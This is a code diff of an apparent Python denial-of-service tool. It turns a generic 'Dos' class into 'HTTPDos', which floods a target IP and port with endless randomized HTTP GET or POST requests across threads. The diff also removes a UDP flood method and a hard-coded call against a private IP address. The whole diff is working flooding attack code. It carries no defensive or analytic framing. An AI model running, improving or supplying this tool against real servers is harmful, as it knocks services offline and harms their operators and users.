@@ -2,50 +2,52 @@ import socket
 import random
 import json
 import os
+import sys
+import itertools
 import string
 import time
-from utils import color_text
 from threading import Thread
+from src.utils import color_text
+from src.dos.constants import TCP
 
-TCP = socket.SOCK_STREAM
-UDP = socket.SOCK_DGRAM
 
+class HTTPDos():
 
-class Dos():
-
-    def __init__(self, target_ip, target_port, protocol, udp_size_bytes=1024, thread_number=4):
+    def __init__(self, target_ip, target_port, protocol, http_method=None, udp_size_bytes=1024, thread_number=4):
         self.target_ip = target_ip
         self.target_port = target_port
         self.protocol = protocol
+        self.http_method = http_method
         self.udp_size_bytes = udp_size_bytes
         self.thread_number = thread_number
-
-    def udp_flood(self):
-        """ 
-        UDP flood, send 1024 bytes
-        """
-        sock = socket.socket(socket.AF_INET, UDP)
-        bytes_to_send = random._urandom(self.udp_size_bytes)  # random bytes
-        while True:
-            sock.sendto(bytes_to_send, (self.target_ip, self.target_port))
 
     def http_flood(self):
         """
         HTTP(S) flood
         """
+        if self.http_method == 'get':
+            http_method = self.get_http_request()
+        elif self.http_method == 'post':
+            http_method = self.post_http_request()
+        else:
+            sys.exit(color_text(
+                'red', '[!] Error : HTTP method only GET or POST'))
+
         color_text('green', '[+] Connect to send request ...')
         time.sleep(1)
         color_text('yellow', '[+] Start sending')
-        i = 0
+
+        counter = itertools.count(1)
         while True:
             sock = socket.socket(socket.AF_INET, TCP)
             sock.connect((self.target_ip, self.target_port))
-            sock.send(self.get_http_request())
+            sock.send(http_method)
             sock.close()
-            i += 1
+            i = next(counter)
 
-            if (i != 0 and i % 10000 == 0):
-                print(f'{i} request send !')
+            if i % 10_000 == 0:
+                sys.stdout.write(f'{i} request send !\r\n')
+                sys.stdout.flush()
 
     def get_http_request(self):
         random_ip = self.http_random_ip()
@@ -69,6 +71,8 @@ class Dos():
 
     def post_http_request(self):
         random_ip = self.http_random_ip()
+        body_content = f"{self.http_random_param()}&{self.http_random_param()}"
+
         header = f"POST /{self.http_random_resource()}?{self.http_random_param()} HTTP/1.1\r\n"
         header += f"Host: {self.target_ip}\r\n"
         header += f"Accept: */*\r\n"
@@ -83,10 +87,11 @@ class Dos():
         header += 'Connection: keep-alive\r\n'
         header += 'Pragma: no-cache\r\n'
         header += 'Cache-Control: no-cache\r\n'
-        header += '\r\n'
-        body = f"{self.http_random_param()}&{self.http_random_param()}"
+        header += f'Content-Length: {len(body_content)}'
+        header += '\r\n\r\n'
+        body = body_content
 
-        return header + body + '\r\n\r\n'
+        return (header + body + '\r\n\r\n').encode()
 
     def http_random_agent(self):
         """Select a random agent from the list"""
@@ -116,16 +121,16 @@ class Dos():
         Manage threads and choose attack method
         """
         threads = []
-        for _ in range(self.thread_number):
-            if self.protocol != False and self.protocol != '':
-                if self.protocol == UDP:
-                    thread = Thread(target=self.udp_flood)
-                threads.append(thread)
-                thread.start()
-            else:
-                print('Bad method')
-                return
+        try:
+            for _ in range(self.thread_number):
+                if self.protocol != False and self.protocol != '':
+                    if self.protocol == 'http' or self.protocol == 'https':
+                        thread = Thread(target=self.http_flood())
+                        threads.append(thread)
+                        thread.start()
+                else:
+                    print('Bad method')
+                    return
 
-
-dos = Dos("172.27.104.41", 8080, 'http')
-print(dos.http_flood())
+        except Exception as e:
+            color_text('red', f'[!] Error: {e}')
